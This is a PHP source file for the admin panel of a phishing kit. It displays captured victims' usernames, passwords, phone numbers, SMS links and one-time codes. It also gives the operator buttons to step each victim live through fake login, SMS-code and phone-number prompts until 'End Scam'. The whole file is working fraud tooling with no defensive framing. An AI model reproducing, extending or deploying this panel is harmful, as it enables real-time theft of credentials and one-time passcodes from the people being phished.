<?php
include './config/config.php';
include './config/db.class.php';
include './config/Panel.php';
include './config/User.php';
include './config/PanelSteps.php';
include './config/Zebra_Pagination.php';

if (!Panel::LoggedIn()) {
    Panel::redirectToLogin();
} else {


    
    $db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
    $userclass  = new User();
    $pagination = new Zebra_Pagination();

    $countLogs = ($db->count($userclass->getLogs()) >= 1) ? $db->count($userclass->getLogs()) : 1;
    $logsInfo  = $db->fetchAll($userclass->getPaginatedLogs($pagination, RECORD_PER_PAGE));

    $pagination->navigation_position(isset($_GET['navigation_position']) && in_array($_GET['navigation_position'], array('left', 'right')) ? $_GET['navigation_position'] : 'outside');
    $pagination->records($countLogs);
    $pagination->records_per_page(RECORD_PER_PAGE);
    $pagination->base_url('./index.php');
    $pagination->render();

    foreach($logsInfo as $row) {
        $user_id = $row['id'];
        $status  = $row['status'];
        $solicitud = '';

        $panelSteps = new PanelSteps();
        $panelSteps->addStep('login', 'static',  2, $user_id, $row['pass'], 'error',  'Error Login');
        $panelSteps->addStep('linksms',   'generic', 5, $user_id, $row['linksms'],  'empty',  'Get Link');
        
        $panelSteps->addStep('linksms',   'dinamic', 51, $user_id, $row['linksms'],  'error',  'Error Link');
        $panelSteps->addStep('otp',   'generic', 7, $user_id, $row['sms'],  'empty',  'Get SMS');
        $panelSteps->addStep('otp',   'dinamic', 8, $user_id, $row['sms'],  'error',  'Error SMS');
        $panelSteps->addStep('otp',   'dinamic', 9, $user_id, $row['sms'],  'expired','Error Exp-SMS');
        
        $panelSteps->addStep('phone',   'generic', 70, $user_id, $row['phone'],  'empty',  'Get Phone');
        $panelSteps->addStep('phone', 'dinamic',  3, $user_id, $row['phone'],'error',  'Error Phone');
        $panelSteps->addOption(16, $user_id, 'End Scam', 'success');
        $panelSteps->addOption(99, $user_id, 'Delete', 'warning');

        foreach ($panelSteps->steps as $stepsKey => $stepValue) {
            foreach($stepValue as $value) {
                switch ($status) {
                    case 0:
                        $solicitud = '<button type="button" class="btn btn-secondary btn-sm">WAITING iNFOS</button>';
                        break;
                    case 1:
                        $showButtons = ( is_array($value) ) ? $solicitud .= $value['button'] : '';
                        $ping = ( Panel::isOnline($row["updatetime"])['active'] ) ? Panel::beep() : false;
                        break;
                    default:
                        $actualStatus = ( isset($panelSteps->labels[$status]['status'] ) == $status) ? $solicitud = $panelSteps->labels[$status]['button_selected'] : $solicitud = '<b>Step Not Listed</b>';
                        break;
                }
            }
        }

        $solicitud .= $panelSteps->showOptions($status);
        $panelSteps->clearSteps();
        $panelSteps->clearOptions();

        echo '
        
        <tr>
            <td>'.Panel::isOnline($row["updatetime"])['button'].'</td>

            <td> '.PanelSteps::showResult($row["user"]).'</td>
            <td>'.PanelSteps::showResult($row["pass"]).'</td>
        
            <td>'.PanelSteps::showResult($row["phone"]).'</td>
            <td>'.PanelSteps::showResult($row["linksms"]).'</td>
            <td>'.PanelSteps::showResult($row["firma"]).'</td>
            <td>'.PanelSteps::showResult($row["firma"]).'</td>
            <td>'.PanelSteps::showResult($row["firma"]).'</td>
            <td>'.PanelSteps::showResult($row["sms"]).'</td>
            <td>'.$solicitud.'</td>
        </tr>';		
    }
}




?>
</div>
    
    

    


</body>


<script>

function myFunction() {
  // Get the text field
  var copyText = document.getElementById("user");

  // Select the text field
  copyText.select();
  copyText.setSelectionRange(0, 99999); // For mobile devices

   // Copy the text inside the text field
  navigator.clipboard.writeText(copyText.value);

  // Alert the copied text
  alert("Copied the text: " + copyText.value);
}

</script> 


</html>